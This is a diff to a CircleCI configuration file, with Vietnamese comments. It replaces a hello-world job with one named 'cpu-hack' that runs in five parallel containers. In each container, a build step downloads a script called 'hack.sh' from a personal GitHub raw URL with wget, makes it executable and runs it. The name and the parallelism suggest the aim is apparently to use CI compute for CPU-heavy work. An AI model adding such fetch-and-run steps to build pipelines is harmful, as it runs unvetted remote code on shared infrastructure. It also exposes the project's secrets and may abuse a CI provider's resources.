@@ -1,31 +1,47 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/reference/configuration-reference
+# .circleci/config.yml
 version: 2.1
 
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/guides/orchestrate/jobs-steps/#jobs-overview & https://circleci.com/docs/reference/configuration-reference/#jobs
 jobs:
-  say-hello:
-    # Specify the execution environment. You can specify an image from Docker Hub or use one of our convenience images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/guides/execution-managed/executor-intro/ & https://circleci.com/docs/reference/configuration-reference/#executor-job
+  cpu-hack:
     docker:
-      # Specify the version you desire here
-      # See: https://circleci.com/developer/images/image/cimg/base
-      - image: cimg/base:current
-
-    # Add steps to the job
-    # See: https://circleci.com/docs/guides/orchestrate/jobs-steps/#steps-overview & https://circleci.com/docs/reference/configuration-reference/#steps
+      - image: cimg/python:3.10   # image Python của CircleCI
+    parallelism: 5               # chạy 5 container song song (tương tự matrix 5 job)
     steps:
-      # Checkout the code as the first step.
       - checkout
-      - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
 
-# Orchestrate jobs using workflows
-# See: https://circleci.com/docs/guides/orchestrate/workflows/ & https://circleci.com/docs/reference/configuration-reference/#workflows
+      - run:
+          name: Show python
+          command: |
+            python --version
+            echo "Running on node index: $CIRCLE_NODE_INDEX / $CIRCLE_NODE_TOTAL"
+
+      - run:
+          name: Download and run hack.sh
+          command: |
+            # tính số job người dễ đọc (1..5) nếu cần
+            JOB_NUM=$((CIRCLE_NODE_INDEX + 1))
+            echo "Job number (1-based): $JOB_NUM"
+
+            # tải script về (thay URL nếu cần)
+            wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
+
+            # an toàn: xem trước 20 dòng đầu (bỏ comment này nếu đã kiểm tra)
+            echo "----- preview hack.sh (first 20 lines) -----"
+            head -n 20 hack.sh || true
+            echo "--------------------------------------------"
+
+            chmod +x hack.sh
+
+            # nếu hack.sh là bash script, chạy trực tiếp
+            ./hack.sh
+
+            # nếu bạn muốn chạy trong 1 virtualenv/python context, ví dụ:
+            # python -m venv venv
+            # . venv/bin/activate
+            # ./hack.sh   # nếu script dùng python thì script tự động dùng venv nếu gọi `python` bên trong
+
 workflows:
-  say-hello-workflow: # This is the name of the workflow, feel free to change it to better match your workflow.
-    # Inside the workflow, you define the jobs you want to run.
+  version: 2
+  run-hack:
     jobs:
-      - say-hello
+      - cpu-hack
